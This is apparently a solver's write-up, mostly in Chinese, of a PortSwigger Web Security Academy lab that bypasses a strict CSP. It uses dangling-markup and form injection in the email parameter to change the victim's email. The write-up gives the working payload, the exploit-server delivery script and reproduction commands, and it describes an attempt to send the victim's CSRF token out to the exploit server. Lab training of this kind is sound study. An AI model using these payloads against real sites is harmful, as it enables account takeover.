---
title: "lab-very-strict-csp-with-dangling-markup-attack"
links:
  - target: xss-context-family
    relation: evidences
  - target: csrf-family
    relation: evidences
---

# lab-very-strict-csp-with-dangling-markup-attack

> evidences: [[xss-context-family]], [[csrf-family]]

- 题面:Reflected XSS protected by very strict CSP, with dangling markup attack(/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
- 实例:https://0a5300f7035a35ba8071215c007d00c4.web-security-academy.net(`wiener:peter`)
- 利用服务器:https://exploit-0abc001703de357d8088203e01f700ba.exploit-server.net
- slug:请求 slug 即真 slug(见下 lab_id)
- 判定目标:诱使受害者点击 → 改其邮箱为 `hacker@evil-user.net`;状态:**solved**(交付后 solved_check true)

## 关键步

1. CSP:`default-src 'self'; object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';`
   —— 外链子资源被禁,**但 `form-action` 未设**(表单可向任意外域提交)。
2. 注入点(实测):`/my-account?email=` 反射进 change-email 表单的 email 输入 `value="…"`,且**位于 csrf 隐藏域之前**。
   注意:`/?search=`、`/login?*`、`/post?postId=` 均无此反射面;`/my-account?id=<非本人>` 会 302 到 /login。
3. 同源表单劫持 payload(把 email 输入值设为目标邮箱 + 注入 "Click" 提交按钮):
   `?email=hacker@evil-user.net"><button type=submit>Click</button>`
   受害者点 "Click" → 应用**自身**表单同源 POST `/my-account/change-email`(email + 其自有 csrf)→ 邮箱被改。
4. 备选(已试、非解法):button `formaction` 指向 exploit-server + `formmethod=get` 可把受害者 token 外带到
   `GET /exfil?email=..&csrf=..`;但该 token **绑定会话**——在我们会话复用 → 400 `Invalid CSRF token`;
   再用跨站 stage-2 自动提交也未解。故正解是让受害者自身同源提交。

## 证据摘录

```
# 交付(redirect 到注入 URL):
(responseBody) <script>location="https://0a5300f7035a35ba8071215c007d00c4.web-security-academy.net/my-account?email=hacker%40evil-user.net%22%3E%3Cbutton%20type%3Dsubmit%3EClick%3C%2Fbutton%3E"</script>
exploit log 见 (Victim) Chrome 交付后 GET /exploit/
solved_check "https://0a5300f7035a35ba8071215c007d00c4.web-security-academy.net/" --jar /tmp/b15-jar3.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 417F3BDBF234C3C15104E0712F05C5F080950E7ECC18C37B7FDAFDE0149BE0EB --widget-source /web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack --jar /tmp/b15-jar3.json
# login wiener:peter (csrf 从 /login)
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<script>location="https://<inst>/my-account?email=hacker%40evil-user.net%22%3E%3Cbutton%20type%3Dsubmit%3EClick%3C%2Fbutton%3E"</script>' --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15-jar3.json
```

## R1 回归验证

实例 `0a040031042cb88583bb4bfc00b900a9`,exploit `exploit-0ad9007a04feb8ac83994a26017200cf`。
`login` wiener:peter 成功(csrf 从 /login 表单取);`/my-account?email=` 反射实测 `value="PROBE1">PROBE2"`(确在 change-email 表单内、csrf 隐藏域之前);
payload URL + `DELIVER_TO_VICTIM` 一次交付后,exploit 页即显示 `is-solved`,实例 banner `solved:true`。件:http_session + banner_verdict。
